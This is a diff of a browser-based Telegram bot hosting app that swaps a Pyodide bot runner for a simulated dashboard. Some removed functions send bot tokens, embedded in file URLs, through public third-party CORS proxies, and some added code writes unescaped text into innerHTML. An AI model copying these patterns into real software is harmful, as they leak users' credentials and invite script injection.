-    if (dbInstance) {
-        const tx = dbInstance.transaction(DB_STORE, "readwrite");
-        tx.objectStore(DB_STORE).clear();
-    }
-    virtualFiles.clear();
-    renderFileList();
-    logTerm("🗑️ Device Database cleared.");
-}
-
-// =========================================================
-// 2. LOGGING, TEMPLATES & FILE UPLOAD HANDLERS
-// =========================================================
-const DEFAULT_TEMPLATES = {
-    python: `import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from io import BytesIO
-
-TOKEN = "YOUR_BOT_TOKEN_HERE"
-bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
-
-@bot.message_handler(commands=['start', 'help'])
-def start_cmd(message):
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        InlineKeyboardButton("⚡ Generate Config", callback_data="gen_cfg"),
-        InlineKeyboardButton("ℹ️ My Info", callback_data="my_info")
-    )
-    bot.reply_to(
-        message,
-        f"🔥 <b>Welcome {message.from_user.first_name}!</b>\\n\\n"
-        f"✅ Your Python Bot is Live with <b>Device DB & File Decryption Support</b>.",
-        reply_markup=markup
-    )
-
-@bot.message_handler(content_types=['document'])
-def handle_doc(message):
-    file_info = bot.get_file(message.document.file_id)
-    raw_bytes = bot.download_file(file_info.file_path)
-    bot.reply_to(message, f"✅ <b>File Downloaded & Processed!</b>\\nName: <code>{message.document.file_name}</code>\\nSize: <code>{len(raw_bytes)} bytes</code>")
-
-bot.infinity_polling()`,
-    javascript: `const TelegramBot = require('node-telegram-bot-api');
-const token = 'YOUR_BOT_TOKEN_HERE';
-const bot = new TelegramBot(token, { polling: true });
-
-bot.onText(/\\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, "🔥 *Node.js Bot is Live on DarkX Cloud!*", { parse_mode: "Markdown" });
-});`,
-    php: `<?php
-$BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-sendMessage($chat_id, "🔥 <b>PHP Bot is Live on DarkX Cloud!</b>", "HTML");
-?>`,
-    json: `{
-  "/start": "🔥 *JSON Bot is Live!*\\nSend /help or any keyword.",
-  "/help": "📌 Available commands: /start, /help, /ping",
-  "ping": "🏓 Pong! Bot is working fast."
-}`
-};
-
-function logTerm(text) {
-    const box = document.getElementById("terminalBox");
-    const t = new Date().toLocaleTimeString();
-    box.textContent += `\n[${t}] ${text}`;
-    if (box.textContent.length > 25000) {
-        box.textContent = box.textContent.slice(-20000);
-    }
-    box.scrollTop = box.scrollHeight;
-    try { localStorage.setItem("darkx_saved_logs", box.textContent); } catch (e) {}
-}
-
-function clearTerminal() {
-    document.getElementById("terminalBox").textContent = "[*] Console cleared.";
-    localStorage.setItem("darkx_saved_logs", "[*] Console cleared.");
-}
-
-function autoExtractToken(code) {
-    const match = code.match(/\b(\d{8,11}:[A-Za-z0-9_-]{33,36})\b/);
-    if (match && match[1]) {
-        document.getElementById("tokenInput").value = match[1];
-        activeToken = match[1];
-        logTerm(`🔑 Auto-detected Bot Token: ${match[1].slice(0, 12)}...`);
-    }
-}
-
-function uint8ToBase64(uint8) {
-    let binary = "";
-    const chunkSize = 0x8000;
-    for (let i = 0; i < uint8.length; i += chunkSize) {
-        binary += String.fromCharCode.apply(null, uint8.subarray(i, i + chunkSize));
-    }
-    return btoa(binary);
-}
-
-function base64ToUint8(b64) {
-    const bin = atob(b64);
-    const arr = new Uint8Array(bin.length);
-    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
-    return arr;
-}
-
-function handleCodeUpload(input) {
-    if (!input.files || !input.files[0]) return;
-    const f = input.files[0];
-    const ext = f.name.split('.').pop().toLowerCase();
-    if (ext === 'js') document.getElementById("langSelect").value = "javascript";
-    else if (ext === 'php') document.getElementById("langSelect").value = "php";
-    else if (ext === 'json') document.getElementById("langSelect").value = "json";
-    else document.getElementById("langSelect").value = "python";
-
-    activeLang = document.getElementById("langSelect").value;
-
-    f.text().then(async (content) => {
-        document.getElementById("codeEditor").value = content;
-        logTerm(`📄 Loaded '${f.name}' (${content.length} bytes) & saved to Device DB.`);
-        autoExtractToken(content);
-        await saveAllToDeviceDB();
-    });
-}
-
-function handleDataUpload(input) {
-    if (!input.files) return;
-    Array.from(input.files).forEach(file => {
-        if (file.name.toLowerCase() === "requirements.txt") {
-            file.text().then(async (txt) => {
-                document.getElementById("reqEditor").value = txt;
-                logTerm(`📦 Loaded requirements.txt into Requirements Box.`);
-                await saveAllToDeviceDB();
-            });
-        }
-        const reader = new FileReader();
-        reader.onload = async () => {
-            const uint8 = new Uint8Array(reader.result);
-            const b64 = uint8ToBase64(uint8);
-            virtualFiles.set(file.name, b64);
-            if (pyodideInstance) {
-                try { pyodideInstance.FS.writeFile(file.name, uint8); } catch (e) {}
-            }
-            renderFileList();
-            await saveAllToDeviceDB();
-            logTerm(`📁 Saved file '${file.name}' (${uint8.length} bytes) to Device DB.`);
-        };
-        reader.readAsArrayBuffer(file);
-    });
-}
-
-function renderFileList() {
-    const box = document.getElementById("fileListBox");
-    box.innerHTML = `<div class="file-item"><span>📄 main.${activeLang === 'python' ? 'py' : activeLang}</span><span>Saved in DB</span></div>`;
-    virtualFiles.forEach((b64, key) => {
-        const size = Math.round((b64.length * 3) / 4);
-        const d = document.createElement("div");
-        d.className = "file-item";
-        d.innerHTML = `<span>📁 ${key}</span><span>${size} B</span>`;
-        box.appendChild(d);
-    });
-}
-
-function switchLanguageTemplate() {
-    activeLang = document.getElementById("langSelect").value;
-    const editor = document.getElementById("codeEditor");
-    if (!editor.value.trim()) {
-        editor.value = DEFAULT_TEMPLATES[activeLang];
-    }
-    saveAllToDeviceDB();
-}
-
-function loadDemoTemplate() {
-    activeLang = document.getElementById("langSelect").value;
-    document.getElementById("codeEditor").value = DEFAULT_TEMPLATES[activeLang];
-    saveAllToDeviceDB();
-    logTerm(`📝 Loaded demo template.`);
-}
-
-// =========================================================
-// 3. TELEGRAM API & PRE-CACHED BINARY FILE DOWNLOADER
-// =========================================================
-async function tgApiAsync(token, method, payload = {}) {
-    const r = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-    });
-    const data = await r.json();
-    if (!data.ok && payload.parse_mode && data.description && data.description.includes("parse entities")) {
-        const retryPayload = { ...payload };
-        delete retryPayload.parse_mode;
-        const r2 = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(retryPayload)
-        });
-        return await r2.json();
-    }
-    return data;
-}
-
-async function preDownloadTelegramFile(fileId) {
-    if (!activeToken || !fileId) return null;
-    try {
-        const gf = await tgApiAsync(activeToken, "getFile", { file_id: fileId });
-        if (!gf.ok || !gf.result || !gf.result.file_path) return null;
-
-        const filePath = gf.result.file_path;
-        const fileSize = gf.result.file_size || 0;
-        tgFileIdMap.set(fileId, { file_path: filePath, file_size: fileSize });
-
-        let b64 = tgFileBytesCache.get(filePath) || "";
-
-        if (!b64) {
-            const rawUrl = `https://api.telegram.org/file/bot${activeToken}/${filePath}`;
-            const proxyUrls = [
-                `https://corsproxy.io/?${encodeURIComponent(rawUrl)}`,
-                `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(rawUrl)}`,
-                `https://api.allorigins.win/raw?url=${encodeURIComponent(rawUrl)}`,
-                rawUrl
-            ];
-
-            for (const u of proxyUrls) {
-                try {
-                    const resp = await fetch(u);
-                    if (resp.ok) {
-                        const buf = await resp.arrayBuffer();
-                        const uint8 = new Uint8Array(buf);
-                        if (uint8.length > 0) {
-                            b64 = uint8ToBase64(uint8);
-                            tgFileBytesCache.set(filePath, b64);
-                            logTerm(`📥 Downloaded file '${filePath.split('/').pop()}' (${uint8.length} bytes) into memory.`);
-                            break;
-                        }
-                    }
-                } catch (e) {}
-            }
-
-            // Fallback via allorigins JSON wrapper if binary proxies were rate-limited
-            if (!b64) {
-                try {
-                    const jResp = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(rawUrl)}`);
-                    if (jResp.ok) {
-                        const jData = await jResp.json();
-                        if (jData && jData.contents) {
-                            const str = jData.contents;
-                            if (str.startsWith("data:") && str.includes(";base64,")) {
-                                b64 = str.split(";base64,")[1];
-                            } else {
-                                const enc = new TextEncoder().encode(str);
-                                b64 = uint8ToBase64(enc);
-                            }
-                            tgFileBytesCache.set(filePath, b64);
-                            logTerm(`📥 Downloaded file '${filePath.split('/').pop()}' via fallback relay.`);
-                        }
-                    }
-                } catch (e) {}
-            }
-        }
-
-        // Inject directly into Python memory cache so bot.get_file() & bot.download_file() work instantaneously!
-        if (pyodideInstance) {
-            pyodideInstance.globals.set("_tmp_fid", String(fileId));
-            pyodideInstance.globals.set("_tmp_fpath", String(filePath));
-            pyodideInstance.globals.set("_tmp_fsize", Number(fileSize));
-            pyodideInstance.globals.set("_tmp_fb64", String(b64));
-            await pyodideInstance.runPythonAsync(`_register_pre_downloaded_file(_tmp_fid, _tmp_fpath, _tmp_fsize, _tmp_fb64)`);
-        }
-        return filePath;
-    } catch (e) {
-        logTerm(`⚠️ File Pre-Fetch Note: ${e.message}`);
-    }
-    return null;
-}
-
-window.syncGetFile = function(fileId) {
-    if (tgFileIdMap.has(fileId)) {
-        const info = tgFileIdMap.get(fileId);
-        return JSON.stringify({ ok: true, result: { file_id: fileId, file_unique_id: fileId, file_size: info.file_size, file_path: info.file_path } });
-    }
-    return window.syncTgCall("getFile", JSON.stringify({ file_id: fileId }));
-};
-
-window.syncDownloadFileBase64 = function(filePath) {
-    if (tgFileBytesCache.has(filePath)) {
-        return tgFileBytesCache.get(filePath);
-    }
-    const rawUrl = `https://api.telegram.org/file/bot${activeToken}/${filePath}`;
-    const proxyUrls = [
-        `https://corsproxy.io/?${encodeURIComponent(rawUrl)}`,
-        `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(rawUrl)}`,
-        `https://api.allorigins.win/raw?url=${encodeURIComponent(rawUrl)}`,
-        rawUrl
-    ];
-    for (const u of proxyUrls) {
-        try {
-            const xhr = new XMLHttpRequest();
-            xhr.open("GET", u, false);
-            xhr.overrideMimeType("text/plain; charset=x-user-defined");
-            xhr.send(null);
-            if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText.length > 0) {
-                const rawText = xhr.responseText;
-                const bytes = new Uint8Array(rawText.length);
-                for (let i = 0; i < rawText.length; i++) {
-                    bytes[i] = rawText.charCodeAt(i) & 0xff;
-                }
-                const b64 = uint8ToBase64(bytes);
-                tgFileBytesCache.set(filePath, b64);
-                return b64;
-            }
-        } catch (e) {}
-    }
-    return "";
-};
-
-window.syncTgCall = function(method, payloadJson) {
-    if (!activeToken) return JSON.stringify({ ok: false, description: "No token" });
-    let payload = {};
-    try { payload = JSON.parse(payloadJson); } catch (e) {}
-
-    try {
-        const xhr = new XMLHttpRequest();
-        xhr.open("POST", `https://api.telegram.org/bot${activeToken}/${method}`, false);
-        xhr.setRequestHeader("Content-Type", "application/json");
-        xhr.send(JSON.stringify(payload));
-        let resp = JSON.parse(xhr.responseText);
-
-        if (!resp.ok && payload.parse_mode && resp.description && resp.description.includes("parse entities")) {
-            delete payload.parse_mode;
-            const xhr2 = new XMLHttpRequest();
-            xhr2.open("POST", `https://api.telegram.org/bot${activeToken}/${method}`, false);
-            xhr2.setRequestHeader("Content-Type", "application/json");
-            xhr2.send(JSON.stringify(payload));
-            resp = JSON.parse(xhr2.responseText);
-        }
-
-        if (resp.ok) {
-            logTerm(`📤 Telegram API [${method}] -> Success`);
-        } else {
-            logTerm(`⚠️ Telegram API [${method}]: ${resp.description}`);
-        }
-        return JSON.stringify(resp);
-    } catch (err) {
-        tgApiAsync(activeToken, method, payload);
-        return JSON.stringify({
-            ok: true,
-            result: { message_id: Math.floor(Date.now() / 1000), chat: { id: payload.chat_id || 0 }, text: payload.text || "" }
-        });
-    }
-};
-
-window.sendTgMultipartBase64 = async function(fieldType, filename, b64Data, optionsJson) {
-    if (!activeToken) return;
-    try {
-        const opts = JSON.parse(optionsJson || "{}");
-        const byteArray = base64ToUint8(b64Data);
-        const blob = new Blob([byteArray], { type: "application/octet-stream" });
-
-        const buildForm = (includeParseMode) => {
-            const form = new FormData();
-            form.append("chat_id", opts.chat_id);
-            form.append(fieldType, blob, filename || "result.txt");
-            if (opts.caption) form.append("caption", opts.caption);
-            if (includeParseMode && opts.parse_mode) form.append("parse_mode", opts.parse_mode);
-            if (opts.reply_to_message_id) form.append("reply_to_message_id", opts.reply_to_message_id);
-            if (opts.reply_markup) form.append("reply_markup", JSON.stringify(opts.reply_markup));
-            return form;
-        };
-
-        const methodMap = { document: "sendDocument", photo: "sendPhoto", video: "sendVideo", audio: "sendAudio", voice: "sendVoice" };
-        const apiMethod = methodMap[fieldType] || "sendDocument";
-
-        let r = await fetch(`https://api.telegram.org/bot${activeToken}/${apiMethod}`, {
-            method: "POST",
-            body: buildForm(true)
-        });
-        let res = await r.json();
-
-        if (!res.ok && opts.parse_mode && res.description && res.description.includes("parse entities")) {
-            r = await fetch(`https://api.telegram.org/bot${activeToken}/${apiMethod}`, {
-                method: "POST",
-                body: buildForm(false)
-            });
-            res = await r.json();
-        }
-
-        if (res.ok) {
-            logTerm(`📎 Sent ${fieldType} '${filename}' (${byteArray.length} B) to ${opts.chat_id}`);
-        } else {
-            logTerm(`⚠️ File Send Error: ${res.description}`);
-        }
-    } catch (e) {
-        logTerm(`❌ Multipart Error: ${e.message}`);
-    }
-};
-
-window.syncHttpFetch = function(method, url, headersJson, bodyStr) {
-    const tryUrls = [
-        url,
-        `https://corsproxy.io/?${encodeURIComponent(url)}`,
-        `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`,
-        `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`
-    ];
-    for (const u of tryUrls) {
-        try {
-            const xhr = new XMLHttpRequest();
-            xhr.open(method || "GET", u, false);
-            if (headersJson) {
-                const hdrs = JSON.parse(headersJson);
-                Object.keys(hdrs).forEach(k => {
-                    if (k.toLowerCase() !== "user-agent" && k.toLowerCase() !== "host") {
-                        try { xhr.setRequestHeader(k, hdrs[k]); } catch (e) {}
-                    }
-                });
-            }
-            xhr.send(bodyStr || null);
-            if (xhr.status >= 200 && xhr.status < 500) {
-                return JSON.stringify({ ok: true, status: xhr.status, text: xhr.responseText });
-            }
-        } catch (e) {}
-    }
-    return JSON.stringify({ ok: false, status: 500, text: "" });
-};
-
-window.setDetectedToken = function(tok) {
-    if (tok && tok.includes(":") && !tok.includes("YOUR_BOT_TOKEN")) {
-        activeToken = tok.trim();
-        document.getElementById("tokenInput").value = activeToken;
-    }
-};
-
-// =========================================================
-// 4. PYTHON ENGINE & REQUIREMENTS INSTALLER
-// =========================================================
-async function ensurePythonEngine() {
-    if (pyodideInstance) return pyodideInstance;
-    if (pyodideLoadingPromise) return await pyodideLoadingPromise;
-
-    const badge = document.getElementById("engineBadge");
-    badge.innerText = "⏳ Starting Python 3.11...";
-
-    pyodideLoadingPromise = (async () => {
-        try {
-            const py = await loadPyodide({
-                indexURL: "https://cdn.jsdelivr.net/pyodide/v0.26.2/full/"
-            });
-            py.setStdout({ batched: (msg) => logTerm(`🐍 ${msg}`) });
-            py.setStderr({ batched: (err) => logTerm(`⚠️ ${err}`) });
-            pyodideInstance = py;
-            badge.innerText = "🟢 Python 3.11 Ready";
-            badge.className = "status-badge online";
-            logTerm("✅ Python 3.11 Engine Loaded & Ready!");
-            return py;
-        } catch (err) {
-            badge.innerText = "⚠️ Python Load Retry";
-            logTerm(`❌ Python Engine Load Error: ${err.message}`);
-            pyodideLoadingPromise = null;
-            throw err;
-        }
-    })();
-
-    return await pyodideLoadingPromise;
-}
-
-const BUILTIN_SHIMMED_PKGS = new Set([
-    "telebot", "pytelegrambotapi", "pyrogram", "tgcrypto", "requests",
-    "urllib", "json", "base64", "re", "html", "io", "datetime", "os", "sys", "time"
-]);
-
-async function installRequirementsAndPackages(py, reqText, code) {
-    const requested = new Set();
-
-    // Parse lines from Requirements textarea
-    (reqText || "").split(/\r?\n/).forEach(line => {
-        const clean = line.split("#")[0].trim().split(/[=<>~!\s]/)[0].trim();
-        if (clean) requested.add(clean);
-    });
-
-    // Auto-detect crypto packages if imported in code
-    if (/\bCrypto\b|\bpycryptodome\b/.test(code)) requested.add("pycryptodome");
-    if (/\bcryptography\b/.test(code)) requested.add("cryptography");
-    if (/\bbs4\b|\bBeautifulSoup\b/.test(code)) requested.add("beautifulsoup4");
-
-    const toInstall = [];
-    for (const pkg of requested) {
-        if (BUILTIN_SHIMMED_PKGS.has(pkg.toLowerCase())) {
-            logTerm(`📦 Requirement '${pkg}' -> Built-in Native Engine Ready.`);
-        } else {
-            toInstall.push(pkg);
-        }
+    // ─── 2. TOAST NOTIFICATION HELPER ─────────────────────────────────────
+    function showToast(message, type = "info") {
+      const container = document.getElementById("toastContainer");
+      const colors = {
+        success: "border-emerald-500/40 bg-emerald-950/90 text-emerald-200",
+        danger:  "border-rose-500/40 bg-rose-950/90 text-rose-200",
+        warn:    "border-amber-500/40 bg-amber-950/90 text-amber-200",
+        info:    "border-indigo-500/40 bg-slate-900/95 text-indigo-200"
+      };
+      const icons = {
+        success: "fa-circle-check text-emerald-400",
+        danger:  "fa-circle-xmark text-rose-400",
+        warn:    "fa-triangle-exclamation text-amber-400",
+        info:    "fa-circle-info text-indigo-400"
+      };
+      const toast = document.createElement("div");
+      toast.className = `pointer-events-auto flex items-center gap-3 px-4 py-3 rounded-xl border shadow-xl backdrop-blur-md text-xs font-medium transition-all duration-300 ${colors[type] || colors.info}`;
+      toast.innerHTML = `
+        <i class="fa-solid ${icons[type] || icons.info} text-sm shrink-0"></i>
+        <span class="flex-1">${message}</span>
+      `;
+      container.appendChild(toast);
+      setTimeout(() => {
+        toast.style.opacity = "0";
+        toast.style.transform = "translateY(8px)";
+        setTimeout(() => toast.remove(), 300);
+      }, 3600);
     }
 
-    if (toInstall.length > 0) {
-        logTerm(`⏳ Installing extra packages: ${toInstall.join(", ")}...`);
-        for (const pkg of toInstall) {
-            try {
-                await py.loadPackage(pkg);
-                logTerm(`✅ Loaded package: ${pkg}`);
-            } catch (e) {
-                try {
-                    await py.loadPackage("micropip");
-                    const micropip = py.pyimport("micropip");
-                    await micropip.install(pkg);
-                    logTerm(`✅ Installed via micropip: ${pkg}`);
-                } catch (e2) {
-                    logTerm(`ℹ️ Note on '${pkg}': ${e2.message}`);
-                }
-            }
-        }
+    function addAudit(action, detail) {
+      const now = new Date().toISOString().slice(11, 19);
+      state.auditLogs.unshift(`[${now}] uid=8253072984 action=${action} ${detail}`);
+      renderAdminPanel();
     }
-}
 
-// =========================================================
-// 5. BACKGROUND KEEP-ALIVE
-// =========================================================
-async function enableBackgroundKeepAlive() {
-    try {
-        if ("wakeLock" in navigator && !wakeLockObj) {
-            wakeLockObj = await navigator.wakeLock.request("screen");
-        }
-    } catch (e) {}
+    // ─── 3. NAVIGATION & HEADER SYNC ──────────────────────────────────────
+    function switchTab(tabId) {
+      state.activeTab = tabId;
+      document.querySelectorAll(".tab-section").forEach(sec => sec.classList.add("hidden"));
+      const target = document.getElementById(`tab-${tabId}`);
+      if (target) target.classList.remove("hidden");
 
-    try {
-        if (!audioKeepAliveCtx) {
-            const AudioCtx = window.AudioContext || window.webkitAudioContext;
-            audioKeepAliveCtx = new AudioCtx();
-            const osc = audioKeepAliveCtx.createOscillator();
-            const gain = audioKeepAliveCtx.createGain();
-            gain.gain.value = 0.0001;
-            osc.connect(gain);
-            gain.connect(audioKeepAliveCtx.destination);
-            osc.start();
-        } else if (audioKeepAliveCtx.state === "suspended") {
-            await audioKeepAliveCtx.resume();
-        }
-    } catch (e) {}
-
-    if (!workerHeartbeat) {
-        try {
-            const blob = new Blob([`setInterval(() => postMessage("tick"), 2000);`], { type: "application/javascript" });
-            workerHeartbeat = new Worker(URL.createObjectURL(blob));
-        } catch (e) {}
+      document.querySelectorAll(".tab-btn").forEach(btn => {
+        btn.classList.remove("border-indigo-500", "text-white", "bg-slate-900/70");
+        btn.classList.add("border-transparent", "text-slate-400");
+      });
+      const activeBtn = document.getElementById(`tabBtn-${tabId}`);
+      if (activeBtn) {
+        activeBtn.classList.remove("border-transparent", "text-slate-400");
+        activeBtn.classList.add("border-indigo-500", "text-white", "bg-slate-900/70");
+      }
+      refreshUI();
     }
-}
 
-// =========================================================
-// 6. START / STOP / POLLING ENGINE
-// =========================================================
-async function startUniversalBot(isAutoResume = false) {
-    if (isBotRunning) return;
+    function refreshUI() {
+      const planObj = PLAN_LIMITS[state.userPlan] || PLAN_LIMITS.free;
+      const runningBots = state.bots.filter(b => b.status === "running");
+      const totalRam = runningBots.reduce((acc, b) => acc + b.memMb, 0);
+      const totalCpu = runningBots.reduce((acc, b) => acc + b.cpu, 0);
 
-    const code = document.getElementById("codeEditor").value;
-    const reqText = document.getElementById("reqEditor").value;
-    activeLang = document.getElementById("langSelect").value;
-    autoExtractToken(code);
-    activeToken = document.getElementById("tokenInput").value.trim();
+      document.getElementById("navSlotsText").textContent = `${state.bots.length} / ${planObj.max_bots}`;
+      document.getElementById("navWalletBalance").textContent = state.wallet;
 
-    if (!activeToken || activeToken === "YOUR_BOT_TOKEN_HERE") {
-        if (!isAutoResume) logTerm("❌ Error: Bot Token nahi mila! Token box mein apna Bot Token daalein.");
+      // Sync top bar dropdown & Plans page current plan indicator
+      const navSelect = document.getElementById("navPlanSelect");
+      if (navSelect) navSelect.value = state.userPlan;
+      const adminPlanSel = document.getElementById("adminGivePlanSelect");
+      if (adminPlanSel) adminPlanSel.value = state.userPlan;
+      const plansPageBadge = document.getElementById("plansPageCurrentBadge");
+      if (plansPageBadge) {
+        plansPageBadge.textContent = `${planObj.name.toUpperCase()} PLAN (${planObj.max_bots} Slots • ${planObj.ram} MB)`;
+      }
+
+      document.getElementById("tabBotsCount").textContent = state.bots.length;
+      document.getElementById("pendingBadgeNav").textContent = state.pendingUploads.length;
+
+      document.getElementById("statRunningBots").textContent = `${runningBots.length} / ${state.bots.length}`;
+      document.getElementById("statRamUsed").textContent = totalRam.toFixed(1);
+      const ramLimitEl = document.getElementById("statRamLimit");
+      if (ramLimitEl) ramLimitEl.textContent = planObj.ram;
+      const autoRestartEl = document.getElementById("statAutoRestartBadge");
+      if (autoRestartEl) {
+        autoRestartEl.className = `text-xs mt-1 flex items-center gap-1 ${planObj.auto_restart ? 'text-emerald-400' : 'text-slate-500'}`;
+        autoRestartEl.innerHTML = `<i class="fa-solid fa-arrows-rotate"></i> ${planObj.auto_restart ? 'Auto-Restart Enabled' : 'Auto-Restart Off (Free)'}`;
+      }
+
+      const ramPct = Math.min(100, Math.round((totalRam / planObj.ram) * 100));
+      document.getElementById("statRamBar").style.width = `${ramPct}%`;
+      document.getElementById("statCpuLoad").textContent = totalCpu.toFixed(1);
+
+      // Update Admin Lock / Unlock state
+      const lockScreen = document.getElementById("adminLockScreen");
+      const unlockedContent = document.getElementById("adminUnlockedContent");
+      const navLockIcon = document.getElementById("adminNavLockIcon");
+      if (state.adminAuthenticated) {
+        if (lockScreen) lockScreen.classList.add("hidden");
+        if (unlockedContent) unlockedContent.classList.remove("hidden");
+        if (navLockIcon) navLockIcon.className = "fa-solid fa-unlock text-emerald-400";
+      } else {
+        if (lockScreen) lockScreen.classList.remove("hidden");
+        if (unlockedContent) unlockedContent.classList.add("hidden");
+        if (navLockIcon) navLockIcon.className = "fa-solid fa-lock text-rose-400";
+      }
+
+      renderDashboardPreview();
+      renderMyBots();
+      renderPlansGrid();
+      renderAdminPanel();
+    }
+
+    // ─── DIRECT PLAN SELECTOR (Whichever plan user clicks becomes active) ──
+    function selectPlanDirect(planKey) {
+      const p = PLAN_LIMITS[planKey];
+      if (!p) return;
+      state.userPlan = planKey;
+      addAudit("plan_select", `plan=${planKey} max_bots=${p.max_bots} ram=${p.ram}MB`);
+      showToast(`✅ ${p.name} Plan is now active! (${p.max_bots} Bot Slots, ${p.ram} MB RAM)`, "success");
+      refreshUI();
+    }
+
+    function restartBot(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      if (!b) return;
+      b.status = "running";
+      b.pid = Math.floor(20000 + Math.random() * 9000);
+      b.cpu = +(2.5 + Math.random() * 4).toFixed(1);
+      b.memMb = +(60 + Math.random() * 70).toFixed(1);
+      b.logs.push(`[↻] Restarting child process...`);
+      b.logs.push(`════════════════ START ${new Date().toISOString()} ════════════════`);
+      showToast(`Restarted ${b.name} cleanly`, "success");
+      refreshUI();
+    }
+
+    function cloneBot(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      if (!b) return;
+      const maxSlots = PLAN_LIMITS[state.userPlan].max_bots;
+      if (state.bots.length >= maxSlots) {
+        showToast("Bot slot limit reached! Upgrade your plan.", "danger");
         return;
+      }
+      const newBot = JSON.parse(JSON.stringify(b));
+      newBot.id = Math.random().toString(16).slice(2, 18);
+      newBot.name = `${b.name}_clone`;
+      newBot.status = "stopped";
+      newBot.pid = null;
+      newBot.cpu = 0;
+      newBot.memMb = 0;
+      newBot.tunnelUrl = "";
+      state.bots.push(newBot);
+      showToast(`Cloned ${b.name} with fresh Fernet key`, "success");
+      refreshUI();
     }
 
-    await saveAllToDeviceDB();
-    document.getElementById("startBtn").disabled = true;
-    document.getElementById("startBtn").innerText = "⏳ Starting Bot...";
+    function deleteBot(botId) {
+      const idx = state.bots.findIndex(x => x.id === botId);
+      if (idx === -1) return;
+      const removed = state.bots.splice(idx, 1)[0];
+      showToast(`Deleted ${removed.name} & wiped keyring entry`, "danger");
+      refreshUI();
+    }
 
-    try {
-        const me = await tgApiAsync(activeToken, "getMe");
-        if (!me.ok) {
-            logTerm(`❌ Invalid Bot Token: ${me.description}`);
-            document.getElementById("startBtn").disabled = false;
-            document.getElementById("startBtn").innerText = "🚀 Host & Start Bot";
-            return;
-        }
-        botStats.botUsername = `@${me.result.username}`;
-        botStats.botId = me.result.id;
-        document.getElementById("botUserLabel").innerText = `Bot: @${me.result.username} (ID: ${me.result.id})`;
-        logTerm(`✅ Verified Bot: @${me.result.username} (ID: ${me.result.id})`);
-    } catch (e) {
-        logTerm(`❌ Network Error: ${e.message}`);
-        document.getElementById("startBtn").disabled = false;
-        document.getElementById("startBtn").innerText = "🚀 Host & Start Bot";
+    function toggleTunnel(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      if (!b) return;
+      if (state.userPlan === "free") {
+        showToast("Cloudflare Public URLs require a paid plan!", "warn");
         return;
+      }
+      if (b.tunnelUrl) {
+        b.tunnelUrl = "";
+        b.logs.push(`[cloudflared] Tunnel closed on port ${b.tunnelPort}`);
+        showToast(`Closed Public URL for ${b.name}`, "info");
+      } else {
+        const slug = b.name.replace(/[^a-z0-9]/gi, "-").toLowerCase();
+        const rand = Math.floor(1000 + Math.random() * 9000);
+        b.tunnelUrl = `https://${slug}-${rand}.trycloudflare.com`;
+        b.logs.push(`[cloudflared] Public tunnel live → ${b.tunnelUrl} (proxying localhost:${b.tunnelPort})`);
+        showToast(`Cloudflare Tunnel live: ${b.tunnelUrl}`, "success");
+      }
+      refreshUI();
     }
 
-    try {
-        if (activeLang === "python") {
-            const py = await ensurePythonEngine();
-            await installRequirementsAndPackages(py, reqText, code);
+    // ─── 6. MODALS: LIVE LOGS, ENV VARS, PIP INSTALLER ────────────────────
+    function closeModal() {
+      const back = document.getElementById("modalBackdrop");
+      back.classList.add("hidden");
+      back.classList.remove("flex");
+    }
 
-            virtualFiles.forEach((b64, name) => {
-                try { py.FS.writeFile(name, base64ToUint8(b64)); } catch (e) {}
-            });
+    function openLogsModal(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      if (!b) return;
+      const modal = document.getElementById("modalContent");
+      modal.innerHTML = `
+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+          <div class="flex items-center gap-2">
+            <i class="fa-solid fa-terminal text-emerald-400"></i>
+            <h3 class="font-bold text-base text-white font-mono">Live Logs — ${b.name}</h3>
+          </div>
+          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+        </div>
+        <div id="liveLogStreamBox" class="terminal-box rounded-xl p-4 h-72 overflow-y-auto text-xs text-emerald-300 space-y-1">
+          ${b.logs.map(line => `<div>${line}</div>`).join("")}
+        </div>
+        <div class="flex justify-between items-center pt-2">
+          <span class="text-[11px] text-slate-400 font-mono">Ring buffer: ${b.logs.length} / 200 lines</span>
+          <div class="flex gap-2">
+            <button onclick="appendSimulatedLog('${b.id}')" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs text-indigo-300 border border-slate-700">
+              <i class="fa-solid fa-rotate mr-1"></i> Refresh Stream
+            </button>
+            <button onclick="closeModal()" class="px-4 py-1.5 rounded-xl bg-indigo-600 text-white text-xs font-semibold">Done</button>
+          </div>
+        </div>
+      `;
+      const back = document.getElementById("modalBackdrop");
+      back.classList.remove("hidden");
+      back.classList.add("flex");
+    }
 
-            const bridgeCode = document.getElementById("pyBridgeSource").textContent;
-            await py.runPythonAsync(bridgeCode);
-            logTerm("✅ TeleBot & File Decryption Bridge Initialized (0 Errors).");
+    function appendSimulatedLog(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      if (!b) return;
+      b.logs.push(`[${new Date().toISOString().slice(11, 19)}] [heartbeat] poll ok — memory RSS ${b.memMb.toFixed(1)} MB`);
+      openLogsModal(botId);
+    }
 
-            logTerm("🚀 Loading your custom bot code...");
-            await py.runPythonAsync(code);
-            logTerm("✅ Custom Bot Handlers Registered Successfully!");
+    function openEnvModal(botId) {
+      const b = state.bots.find(x => x.id === botId);
+      if (!b) return;
+      const entries = Object.entries(b.env);
+      const modal = document.getElementById("modalContent");
+      modal.innerHTML = `
